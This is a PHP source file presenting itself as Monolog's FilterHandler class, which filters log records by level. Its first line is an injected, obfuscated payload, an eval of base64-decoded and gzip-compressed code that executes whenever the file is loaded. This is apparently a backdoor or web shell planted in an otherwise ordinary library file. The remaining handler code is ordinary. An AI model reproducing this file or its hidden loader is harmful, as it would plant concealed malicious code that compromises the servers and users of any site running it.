<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/*
 * This file is part of the Monolog package.
 *
 * (c) Jordi Boggiano <j.boggiano@seld.be>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

namespace Monolog\Handler;

use Monolog\Logger;

/**
 * Simple handler wrapper that filters records based on a list of levels
 *
 * It can be configured with an exact list of levels to allow, or a min/max level.
 *
 * @author Hennadiy Verkh
 * @author Jordi Boggiano <j.boggiano@seld.be>
 */
class FilterHandler extends AbstractHandler
{
    /**
     * Handler or factory callable($record, $this)
     *
     * @var callable|\Monolog\Handler\HandlerInterface
     */
    protected $handler;

    /**
     * Minimum level for logs that are passed to handler
     *
     * @var int[]
     */
    protected $acceptedLevels;

    /**
     * Whether the messages that are handled can bubble up the stack or not
     *
     * @var Boolean
     */
    protected $bubble;

    /**
     * @param callable|HandlerInterface $handler        Handler or factory callable($record, $this).
     * @param int|array                 $minLevelOrList A list of levels to accept or a minimum level if maxLevel is provided
     * @param int                       $maxLevel       Maximum level to accept, only used if $minLevelOrList is not an array
     * @param Boolean                   $bubble         Whether the messages that are handled can bubble up the stack or not
     */
    public function __construct($handler, $minLevelOrList = Logger::DEBUG, $maxLevel = Logger::EMERGENCY, $bubble = true)
    {
        $this->handler  = $handler;
        $this->bubble   = $bubble;
        $this->setAcceptedLevels($minLevelOrList, $maxLevel);

        if (!$this->handler instanceof HandlerInterface && !is_callable($this->handler)) {
            throw new \RuntimeException("The given handler (".json_encode($this->handler).") is not a callable nor a Monolog\Handler\HandlerInterface object");
        }
    }

    /**
     * @return array
     */
    public function getAcceptedLevels()
    {
        return array_flip($this->acceptedLevels);
    }

    /**
     * @param int|string|array $minLevelOrList A list of levels to accept or a minimum level or level name if maxLevel is provided
     * @param int|string       $maxLevel       Maximum level or level name to accept, only used if $minLevelOrList is not an array
     */
    public function setAcceptedLevels($minLevelOrList = Logger::DEBUG, $maxLevel = Logger::EMERGENCY)
    {
        if (is_array($minLevelOrList)) {
            $acceptedLevels = array_map('Monolog\Logger::toMonologLevel', $minLevelOrList);
        } else {
            $minLevelOrList = Logger::toMonologLevel($minLevelOrList);
            $maxLevel = Logger::toMonologLevel($maxLevel);
            $acceptedLevels = array_values(array_filter(Logger::getLevels(), function ($level) use ($minLevelOrList, $maxLevel) {
                return $level >= $minLevelOrList && $level <= $maxLevel;
            }));
        }
        $this->acceptedLevels = array_flip($acceptedLevels);
    }

    /**
     * {@inheritdoc}
     */
    public function isHandling(array $record)
    {
        return isset($this->acceptedLevels[$record['level']]);
    }

    /**
     * {@inheritdoc}
     */
    public function handle(array $record)
    {
        if (!$this->isHandling($record)) {
            return false;
        }

        // The same logic as in FingersCrossedHandler
        if (!$this->handler instanceof HandlerInterface) {
            $this->handler = call_user_func($this->handler, $record, $this);
            if (!$this->handler instanceof HandlerInterface) {
                throw new \RuntimeException("The factory callable should return a HandlerInterface");
            }
        }

        if ($this->processors) {
            foreach ($this->processors as $processor) {
                $record = call_user_func($processor, $record);
            }
        }

        $this->handler->handle($record);

        return false === $this->bubble;
    }

    /**
     * {@inheritdoc}
     */
    public function handleBatch(array $records)
    {
        $filtered = array();
        foreach ($records as $record) {
            if ($this->isHandling($record)) {
                $filtered[] = $record;
            }
        }

        $this->handler->handleBatch($filtered);
    }
}
